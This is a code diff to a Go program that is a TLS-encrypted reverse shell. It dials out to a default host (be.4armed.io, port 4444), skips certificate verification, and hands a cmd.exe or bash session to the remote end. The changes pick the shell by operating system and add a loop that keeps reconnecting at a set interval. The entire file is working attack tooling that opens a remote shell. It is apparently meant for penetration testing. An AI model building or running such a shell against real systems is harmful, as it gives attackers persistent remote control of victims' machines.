@@ -13,14 +13,9 @@ import (
 	"math/big"
 	"os"
 	"os/exec"
+	"runtime"
 	"time"
 )
-
-type Options struct {
-	Host    string
-	Port    string
-	Command string
-}
 
 func publicKey(priv interface{}) interface{} {
 	switch k := priv.(type) {
@@ -32,16 +27,25 @@ func publicKey(priv interface{}) interface{} {
 }
 
 func main() {
-	options := &Options{}
+	var defaultCmd string
 
-	flag.StringVar(&options.Host, "h", "be.4armed.io", "Host to connect to")
-	flag.StringVar(&options.Port, "p", "4444", "Port to connect to")
-	flag.StringVar(&options.Command, "c", "cmd.exe", "Command to run")
+	switch runtime.GOOS {
+	case "windows":
+		defaultCmd = "cmd.exe"
+	default:
+		defaultCmd = "bash"
+	}
+
+	host := flag.String("h", "be.4armed.io", "Host to connect to")
+	port := flag.String("p", "4444", "Port to connect to")
+	command := flag.String("c", defaultCmd, "Command to run")
+	keepTrying := flag.Bool("k", false, "Keep trying to connect")
+	retry := flag.Int("r", 60, "Retry interval in seconds")
 	flag.Parse()
 
-	connectionString := fmt.Sprintf("%s:%s", options.Host, options.Port)
+	connectionString := fmt.Sprintf("%s:%s", *host, *port)
 
-	cmd := exec.Command(options.Command)
+	cmd := exec.Command(*command)
 	priv, err := ecdsa.GenerateKey(elliptic.P521(), rand.Reader)
 	if err != nil {
 		log.Fatal(err)
@@ -71,13 +75,32 @@ func main() {
 
 	// Load our generated key and cert. Don't verify the cert at the remote end
 	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
-	conn, err := tls.Dial("tcp", connectionString, &config)
-	if err != nil {
-		os.Exit(2)
-	}
+	var conn *tls.Conn
 
-	cmd.Stdin = conn
-	cmd.Stdout = conn
-	cmd.Stderr = conn
-	cmd.Run()
+	if *keepTrying {
+		for {
+			conn, err = tls.Dial("tcp", connectionString, &config)
+			if err != nil {
+				fmt.Println(err)
+				time.Sleep(time.Duration(*retry) * time.Second)
+				continue
+			}
+
+			cmd.Stdin = conn
+			cmd.Stdout = conn
+			cmd.Stderr = conn
+			cmd.Run()
+		}
+	} else {
+		conn, err = tls.Dial("tcp", connectionString, &config)
+		if err != nil {
+			fmt.Println(err)
+			os.Exit(1)
+		}
+
+		cmd.Stdin = conn
+		cmd.Stdout = conn
+		cmd.Stderr = conn
+		cmd.Run()
+	}
 }
